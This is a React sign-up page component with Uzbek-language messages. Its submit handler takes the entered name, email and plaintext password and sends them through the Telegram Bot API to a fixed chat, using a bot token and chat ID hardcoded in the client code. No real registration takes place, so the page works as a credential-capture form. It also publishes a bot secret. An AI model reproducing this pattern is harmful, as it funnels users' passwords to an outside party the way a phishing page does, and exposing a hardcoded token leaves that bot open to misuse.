import React, { useState } from "react";
import "./signup.css";
import { FaGoogle, FaGithub } from "react-icons/fa";
import { Link } from "react-router-dom";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

function SignUp() {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [pass, setPass] = useState("");
async function handleSubmit(e) {
  e.preventDefault();

  let botToken = "8201661237:AAHCpolGOJE8Fopd-itpNn8lXJXFwxg8Zmg"; 
  let chatId = 6491991337; 
  let message = `📝 Yangi Sign Up:\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${pass}`;

  try {
    let response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message }),
      }
    );

    let data = await response.json();
    console.log("Telegram javobi:", data);

    if (response.ok) {
      toast.success("✅ Ro‘yxatdan o‘tish yuborildi!");
      setName("");
      setEmail("");
      setPass("");
    } else {
      toast.error("❌ Xabar yuborilmadi!");
    }
  } catch (error) {
    console.error(error);
    toast.error("⚠️ Tarmoq xatosi");
  }
}


  return (
    <div className="signup-page">
      <ToastContainer />
      <h1 className="signup-title">Sign Up Page</h1>
      <p className="signup-breadcrumb">Home / Sign Up Page</p>

      <div className="signup-card">

        <div className="signup-buttons">
          <button className="signup-btn social-btn">
            <FaGoogle className="icon" /> Sign Up
          </button>
          <button className="signup-btn social-btn">
            <FaGithub className="icon" /> Sign Up
          </button>
        </div>

        <div className="divider">OR</div>

  
        <form className="signup-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Name"
            required
            value={name}
            onChange={(e) => setName(e.target.value)}
          />
          <input
            type="email"
            placeholder="Email"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            required
            value={pass}
            onChange={(e) => setPass(e.target.value)}
          />
          <button type="submit" className="signup-btn primary-btn">
            Sign Up
          </button>
        </form>

        <div className="signup-links">
          <p>
            Already have an account? <Link to={"/login"}>Sign in</Link>
          </p>
        </div>
      </div>
    </div>
  );
}

export default SignUp;
